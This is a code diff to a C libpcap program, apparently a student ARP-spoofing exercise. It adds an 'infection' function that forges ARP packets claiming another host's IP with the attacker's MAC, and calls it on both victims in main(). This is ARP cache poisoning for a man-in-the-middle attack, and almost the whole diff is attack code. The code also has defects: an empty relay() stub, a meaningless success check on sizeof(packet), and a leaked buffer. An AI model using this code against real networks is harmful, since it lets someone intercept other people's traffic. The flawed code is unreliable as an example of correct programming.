@@ -72,6 +72,36 @@ bool recive_packet(const u_char *packet,uint8_t *mac)
 
     return false;
 }
+
+bool infection(pcap_t *handle,uint8_t *mymac ,uint32_t *my_ip, in_addr *_senderip,in_addr *_targetip,uint8_t *_targetmac)
+{
+    u_char *packet;
+    libnet_ethernet_hdr ethernet_infection;
+    arp_hdr arp_req_infection;
+    packet =(u_char *) malloc(sizeof(ethernet_infection) + sizeof(arp_req_infection));
+    //recv infection
+    memcpy(ethernet_infection.ether_dhost,_targetmac,6);
+    memcpy(ethernet_infection.ether_shost,mymac,6);
+
+    ethernet_infection.ether_type = htons(ETHERTYPE_ARP);
+    arp_req_infection.ar_hln = 6;
+    arp_req_infection.ar_pln = 4;
+    arp_req_infection.ar_hrd = htons(ARPHRD_ETHER);
+    arp_req_infection.ar_pro = htons(ETHERTYPE_IP);
+    arp_req_infection.ar_op = htons(ARPOP_REQUEST);
+
+    memcpy(arp_req_infection.ar_sender_ip,_senderip,4);
+    memcpy(arp_req_infection.ar_sender_mac,mymac,6);
+    memcpy(arp_req_infection.ar_target_ip,_targetip,4);
+    memcpy(arp_req_infection.ar_target_mac,_targetmac,6);
+    memcpy(packet,&ethernet_infection,sizeof(ethernet_infection));//
+    memcpy(packet+sizeof(ethernet_infection),&arp_req_infection, sizeof(arp_req_infection));//
+    pcap_sendpacket(handle,packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));//
+    if(sizeof(packet) != NULL)
+        return true;
+
+    return false;
+}
 bool relay()
 {
 }
@@ -131,13 +161,14 @@ int main(int argc, char *argv[])
     {
 
 
-
+        printf("setting.....\n");
         while(1)
         {
             pcap_next_ex(p_handle,&header,&buffer);
             if(recive_packet(buffer,recvmac) == true)
             {
-                printf("setting.....\n");
+
+                infection(p_handle,mymac->ether_addr_octet, &myip, &targetip,&recvip,recvmac);
                 break;
             }
         }
@@ -150,14 +181,19 @@ int main(int argc, char *argv[])
     {
         while(1)
         {
+            printf("setting.....\n");
             pcap_next_ex(p_handle,&header,&buffer);
             if(recive_packet(buffer,targetmac) == true)
             {
-                printf("setting.....\n");
+                infection(p_handle,mymac->ether_addr_octet, &myip, &recvip,&targetip,targetmac);
                 break;
             }
 
         }
+
+
+        printf("!");
+
 
 
 
@@ -170,6 +206,7 @@ int main(int argc, char *argv[])
     //infection
 
 
+    printf("!!\n");
 
 
 
@@ -180,5 +217,8 @@ int main(int argc, char *argv[])
 
     return 0;
 }
+
+
+
 
 
